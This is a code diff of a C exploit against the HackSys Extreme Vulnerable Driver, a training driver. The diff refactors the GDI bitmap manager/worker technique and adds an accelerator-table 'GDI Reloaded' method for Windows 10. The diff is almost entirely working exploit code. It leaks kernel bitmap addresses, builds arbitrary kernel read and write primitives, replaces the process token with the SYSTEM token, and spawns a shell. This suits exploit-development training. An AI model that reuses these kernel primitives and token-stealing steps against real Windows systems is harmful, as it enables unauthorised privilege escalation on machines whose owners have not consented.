@@ -10,11 +10,128 @@ LONG BitmapArbitraryRead(HBITMAP hManager, HBITMAP hWorker, LPVOID lpReadAddress
 	return GetBitmapBits(hWorker, dwReadLen, lpReadResult); // Use Worker to Read result into lpReadResult Pointer.
 }
 
+
 LONG BitmapArbitraryWrite(HBITMAP hManager, HBITMAP hWorker, LPVOID lpWriteAddress, LPVOID lpWriteValue, DWORD dwWriteLen)
 {
 	SetBitmapBits(hManager, dwWriteLen, &lpWriteAddress);     // Set Workers pvScan0 to the Address we want to write.
 	return SetBitmapBits(hWorker, dwWriteLen, &lpWriteValue); // Use Worker to Write at Arbitrary Kernel address.
 }
+
+
+PPEB GetProcessPEB(HANDLE hProcess, DWORD dwPID)
+{
+	PROCESS_BASIC_INFORMATION pbi;
+	PPEB peb;
+
+	wprintf(L" [*] Reading Process PEB Address");
+
+	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)
+		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
+	if (NtQueryInformationProcess == NULL) {
+		wprintf(L" -> Unable to get Module handle!\n\n");
+		exit(1);
+	}
+
+	// Retrieves information about the specified process.
+	NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);
+
+	// Read pbi.PebBaseAddress into PEB Structure
+	if (!ReadProcessMemory(hProcess, &pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
+		wprintf(L" -> Unable to read Process Memory!\n\n");
+		CloseHandle(hProcess);
+		exit(1);
+	}
+
+	wprintf(L" -> Done!\n");
+	wprintf(L" [+] PEB Address is at: 0x%p \n\n", (LPVOID)peb);
+
+	return peb;
+}
+
+
+LeakBitmapInfo GDILeakBitmap(HANDLE hProcess, PPEB peb, LPCWSTR lpBitmapName, DWORD dwOffsetToPvScan0)
+{
+	PGDICELL gdiCell;
+	LeakBitmapInfo BitmapInfo;
+	
+	wprintf(L" [*] Creating %ls Bitmap and lookup pvScan0 addresses", lpBitmapName);
+
+	BYTE buf[0x64 * 0x64 * 4];
+	BitmapInfo.hBitmap = CreateBitmap(0x64, 0x64, 1, 32, &buf);
+
+	// Read PEB->GdiSharedHandleTable Address into GDICELL Structure
+	if (!ReadProcessMemory(hProcess, &peb->GdiSharedHandleTable, &gdiCell, sizeof(gdiCell), NULL)) {
+		wprintf(L" -> Unable to read Process Memory!\n\n");
+		CloseHandle(hProcess);
+		exit(1);
+	}
+
+	wprintf(L" -> Done!\n");
+	wprintf(L" [+] GdiSharedHandleTable is at: 0x%p \n", (LPVOID)gdiCell);
+
+	GDICELL gManagerCell = *((PGDICELL)((PUCHAR)gdiCell + LOWORD(BitmapInfo.hBitmap) * sizeof(GDICELL)));
+	BitmapInfo.pBitmapPvScan0 = (PUCHAR)gManagerCell.pKernelAddress + dwOffsetToPvScan0;
+
+	wprintf(L" [+] %ls Bitmap Handle at: 0x%08x \n", lpBitmapName, (ULONG)BitmapInfo.hBitmap);
+	wprintf(L" [+] %ls Bitmap Kernel Object: 0x%p \n", lpBitmapName, gManagerCell.pKernelAddress);
+	wprintf(L" [+] %ls Bitmap pvScan0 Pointer: 0x%p \n\n", lpBitmapName, BitmapInfo.pBitmapPvScan0);
+
+	return BitmapInfo;
+}
+
+
+LeakBitmapInfo GDIReloaded(LPCWSTR lpBitmapName, DWORD dwOffsetToPvScan0)
+{
+	LeakBitmapInfo BitmapInfo;
+	DWORD dwCounter = 0;
+	HACCEL hAccel;							// Handle to Accelerator table 
+	LPACCEL lpAccel;						// Pointer to Accelerator table Array
+	PUSER_HANDLE_ENTRY AddressA = NULL;
+	PUSER_HANDLE_ENTRY AddressB = NULL;
+	PUCHAR pAcceleratorAddrA = NULL;
+	PUCHAR pAcceleratorAddrB = NULL;
+
+	PSHAREDINFO pSharedInfo = (PSHAREDINFO)GetProcAddress(GetModuleHandle(L"user32.dll"), "gSharedInfo");
+	PUSER_HANDLE_ENTRY gHandleTable = pSharedInfo->aheList;
+	DWORD index;
+
+	// Allocate Memory for the Accelerator Array
+	lpAccel = (LPACCEL)LocalAlloc(LPTR, sizeof(ACCEL) * 700);
+
+	wprintf(L" [*] Creating and Freeing AcceleratorTables");
+
+	while (dwCounter < 20) {
+		hAccel = CreateAcceleratorTable(lpAccel, 700);
+		index = LOWORD(hAccel);
+		AddressA = &gHandleTable[index];
+		pAcceleratorAddrA = (PUCHAR)AddressA->pKernel;
+		DestroyAcceleratorTable(hAccel);
+
+		hAccel = CreateAcceleratorTable(lpAccel, 700);
+		index = LOWORD(hAccel);
+		AddressB = &gHandleTable[index];
+		pAcceleratorAddrB = (PUCHAR)AddressB->pKernel;
+
+		if (pAcceleratorAddrA == pAcceleratorAddrB) {
+			DestroyAcceleratorTable(hAccel);
+			LPVOID lpBuf = VirtualAlloc(NULL, 0x50 * 2 * 4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+			BitmapInfo.hBitmap = CreateBitmap(0x701, 2, 1, 8, lpBuf);
+			break;
+		}
+		DestroyAcceleratorTable(hAccel);
+		dwCounter++;
+	}
+
+	wprintf(L" -> Done!\n");
+
+	BitmapInfo.pBitmapPvScan0 = pAcceleratorAddrA + dwOffsetToPvScan0;
+	wprintf(L" [+] Duplicate AcceleratorTable Address: 0x%p \n", pAcceleratorAddrA);
+	wprintf(L" [+] %ls Bitmap Handle at: 0x%08x \n", lpBitmapName, (ULONG)BitmapInfo.hBitmap);
+	wprintf(L" [+] Worker Bitmap pvScan0 Pointer: 0x%p \n\n", BitmapInfo.pBitmapPvScan0);
+
+	return BitmapInfo;
+}
+
 
 FARPROC WINAPI KernelSymbolInfo(LPCSTR lpSymbolName)
 {
@@ -75,6 +192,7 @@ FARPROC WINAPI KernelSymbolInfo(LPCSTR lpSymbolName)
 	return pLiveFunctionAddress;
 }
 
+
 BOOL IsSystem(VOID)
 {
 	DWORD dwSize = 0, dwResult = 0;
@@ -114,6 +232,7 @@ BOOL IsSystem(VOID)
 	return TRUE;
 }
 
+
 void PopShell()
 {
 	STARTUPINFO si = { sizeof(STARTUPINFO) };
@@ -131,13 +250,11 @@ void PopShell()
 int wmain(int argc, wchar_t* argv[])
 {
 	OSVERSIONINFOEXW osInfo;
-	DWORD dwPID;
-	PROCESS_BASIC_INFORMATION pbi;
 	PPEB peb;
-	HBITMAP hManager;
-	HBITMAP hWorker;
-	PGDICELL gdiCell;
+	DWORD dwPID;
 	LPVOID lpSourceTargetAddress = NULL;
+	LeakBitmapInfo ManagerBitmap;
+	LeakBitmapInfo WorkerBitmap;
 	HANDLE hDevice;
 	LPCWSTR lpDeviceName = L"\\\\.\\HacksysExtremeVulnerableDriver";
 	BOOL bResult = FALSE;
@@ -246,68 +363,34 @@ int wmain(int argc, wchar_t* argv[])
 	
 	wprintf(L" [*] Exploit running on Windows Version: %ls %ls build %u \n\n", lpOSVersion, lpOSArch, osInfo.dwBuildNumber);
 	
-	wprintf(L" [*] Reading Process PEB Address");
-	
-	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)
-		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
-	if (NtQueryInformationProcess == NULL) {
-		wprintf(L" -> Unable to get Module handle!\n\n");
-		exit(1);
-	}
-
+	// Get our Process ID
 	dwPID = GetCurrentProcessId();
-	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPID);
-	if (hProcess == INVALID_HANDLE_VALUE)
-	{
-		wprintf(L" -> Unable to get Process handle!\n\n");
-		exit(1);
+
+	// For Windows 10 use GDI reloaded Method and for other versions the original GDI method  
+	if (_wcsicmp(chOSMajorMinor, L"10.0") == 0) {		
+		// Creating and Freeing AcceleratorTables and lookup pvScan0 addresses
+		ManagerBitmap = GDIReloaded(L"Manager", dwOffsetToPvScan0);
+		WorkerBitmap = GDIReloaded(L"Worker", dwOffsetToPvScan0);
 	}
+	else {
+		// Open a Handle to our Process
+		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPID);
+		if (hProcess == INVALID_HANDLE_VALUE)
+		{
+			wprintf(L" -> Unable to get Process handle!\n\n");
+			exit(1);
+		}
 
-	// Retrieves information about the specified process.
-	NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);
+		// Reading Process PEB
+		peb = GetProcessPEB(hProcess, dwPID);
 
-	// Read pbi.PebBaseAddress into PEB Structure
-	if (!ReadProcessMemory(hProcess, &pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
-		wprintf(L" -> Unable to read Process Memory!\n\n");
+		// Creating Bitmaps and lookup pvScan0 addresses
+		ManagerBitmap = GDILeakBitmap(hProcess, peb, L"Manager", dwOffsetToPvScan0);
+		WorkerBitmap = GDILeakBitmap(hProcess, peb, L"Worker", dwOffsetToPvScan0);
+
+		// Release Process Handle
 		CloseHandle(hProcess);
-		exit(1);
 	}
-
-	wprintf(L" -> Done!\n");
-	wprintf(L" [+] PEB Address is at: 0x%p \n\n", (LPVOID)peb);
-
-	wprintf(L" [*] Creating Bitmaps and lookup pvScan0 addresses");
-	
-	BYTE buf[0x64 * 0x64 * 4];
-	hManager = CreateBitmap(0x64, 0x64, 1, 32, &buf);
-	hWorker = CreateBitmap(0x64, 0x64, 1, 32, &buf);
-
-	// Read PEB->GdiSharedHandleTable Address into GDICELL Structure
-	if (!ReadProcessMemory(hProcess, &peb->GdiSharedHandleTable, &gdiCell, sizeof(gdiCell), NULL)) {
-		wprintf(L" -> Unable to read Process Memory!\n\n");
-		CloseHandle(hProcess);
-		exit(1);
-	}
-
-	wprintf(L" -> Done!\n");
-	wprintf(L" [+] GdiSharedHandleTable is at: 0x%p \n", (LPVOID)gdiCell);
-
-	GDICELL gManagerCell = *((PGDICELL)((PUCHAR)gdiCell + LOWORD(hManager) * sizeof(GDICELL)));
-	PUCHAR pManagerPvScan0 = (PUCHAR)gManagerCell.pKernelAddress + dwOffsetToPvScan0;
-
-	wprintf(L" [+] Manager Bitmap Handle at: 0x%08x \n", (ULONG)hManager);
-	wprintf(L" [+] Manager Bitmap Kernel Object: 0x%p \n", gManagerCell.pKernelAddress);
-	wprintf(L" [+] Manager Bitmap pvScan0 Pointer: 0x%p \n", pManagerPvScan0);
-
-	GDICELL gWorkerCell = *((PGDICELL)((PUCHAR)gdiCell + LOWORD(hWorker) * sizeof(GDICELL)));
-	PUCHAR pWorkerPvScan0 = (PUCHAR)gWorkerCell.pKernelAddress + dwOffsetToPvScan0;
-
-	wprintf(L" [+] Worker Bitmap Handle at: 0x%08x \n", (ULONG)hWorker);
-	wprintf(L" [+] Worker Bitmap Kernel Object: 0x%p \n", gWorkerCell.pKernelAddress);
-	wprintf(L" [+] Worker Bitmap pvScan0 Pointer: 0x%p \n\n", pWorkerPvScan0);
-
-	// Release Process Handle
-	CloseHandle(hProcess);
 	
 	wprintf(L" [*] Trying to get a handle to the following Driver: %ls", lpDeviceName);
 
@@ -332,11 +415,11 @@ int wmain(int argc, wchar_t* argv[])
 
 	// Create a double Pointer to pWorkerPvScan0
 	lpSourceTargetAddress = (LPVOID)malloc(sizeof(LPVOID));
-	lpSourceTargetAddress = &pWorkerPvScan0;
+	lpSourceTargetAddress = &WorkerBitmap.pBitmapPvScan0;
 
 	chOverwriteBuffer = (PUCHAR)malloc(sizeof(LPVOID) * 2);
 	memcpy(chOverwriteBuffer, &lpSourceTargetAddress, (sizeof(LPVOID)));
-	memcpy(chOverwriteBuffer + (sizeof(LPVOID)), &pManagerPvScan0, (sizeof(LPVOID)));
+	memcpy(chOverwriteBuffer + (sizeof(LPVOID)), &ManagerBitmap.pBitmapPvScan0, (sizeof(LPVOID)));
 
 	wprintf(L" -> Done!\n");
 	wprintf(L" [+] Our Overwrite Buffer is available at: 0x%p \n\n", chOverwriteBuffer);
@@ -382,10 +465,10 @@ int wmain(int argc, wchar_t* argv[])
 	LIST_ENTRY leNextProcessLink;
 	LPVOID lpSystemToken = NULL;
 
-	BitmapArbitraryRead(hManager, hWorker, (LPVOID)fpFunctionAddress, &lpSystemEPROCESS, sizeof(LPVOID));
-	BitmapArbitraryRead(hManager, hWorker, (PUCHAR)lpSystemEPROCESS + dwUniqueProcessIdOffset, &lpSysProcID, sizeof(LPVOID));
-	BitmapArbitraryRead(hManager, hWorker, (PUCHAR)lpSystemEPROCESS + dwActiveProcessLinks, &leNextProcessLink, sizeof(LIST_ENTRY));
-	BitmapArbitraryRead(hManager, hWorker, (PUCHAR)lpSystemEPROCESS + dwTokenOffset, &lpSystemToken, sizeof(LPVOID));
+	BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (LPVOID)fpFunctionAddress, &lpSystemEPROCESS, sizeof(LPVOID));
+	BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpSystemEPROCESS + dwUniqueProcessIdOffset, &lpSysProcID, sizeof(LPVOID));
+	BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpSystemEPROCESS + dwActiveProcessLinks, &leNextProcessLink, sizeof(LIST_ENTRY));
+	BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpSystemEPROCESS + dwTokenOffset, &lpSystemToken, sizeof(LPVOID));
 
 	DWORD dwSysProcID = LOWORD(lpSysProcID);
 	
@@ -397,18 +480,18 @@ int wmain(int argc, wchar_t* argv[])
 
 	// Use BitmapArbitraryRead() to find Current Process Token and replace it with the SystemToken
 	wprintf(L" [*] Reading Current _EPROCESS structure");
-	
+
 	LPVOID lpNextEPROCESS = NULL;
 	LPVOID lpCurrentPID = NULL;
 	LPVOID lpCurrentToken = NULL;
 	DWORD dwCurrentPID;
 	do {
 		lpNextEPROCESS = (PUCHAR)leNextProcessLink.Flink - dwActiveProcessLinks;	
-		BitmapArbitraryRead(hManager, hWorker, (PUCHAR)lpNextEPROCESS + dwUniqueProcessIdOffset, &lpCurrentPID, sizeof(LPVOID));
-		BitmapArbitraryRead(hManager, hWorker, (PUCHAR)lpNextEPROCESS + dwTokenOffset, &lpCurrentToken, sizeof(LPVOID));
+		BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpNextEPROCESS + dwUniqueProcessIdOffset, &lpCurrentPID, sizeof(LPVOID));
+		BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpNextEPROCESS + dwTokenOffset, &lpCurrentToken, sizeof(LPVOID));
 		
 		// Read _LIST_ENTRY to next Active _EPROCESS Structure
-		BitmapArbitraryRead(hManager, hWorker, (PUCHAR)lpNextEPROCESS + dwActiveProcessLinks, &leNextProcessLink, sizeof(LIST_ENTRY));
+		BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpNextEPROCESS + dwActiveProcessLinks, &leNextProcessLink, sizeof(LIST_ENTRY));
 	
 		dwCurrentPID = LOWORD(lpCurrentPID);
 
@@ -422,7 +505,7 @@ int wmain(int argc, wchar_t* argv[])
 
 	wprintf(L" [*] Replace Current Token");
 
-	BitmapArbitraryWrite(hManager, hWorker, (PUCHAR)lpNextEPROCESS + dwTokenOffset, lpSystemToken, sizeof(LPVOID));
+	BitmapArbitraryWrite(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpNextEPROCESS + dwTokenOffset, lpSystemToken, sizeof(LPVOID));
 
 	wprintf(L" -> Done!\n\n");
 
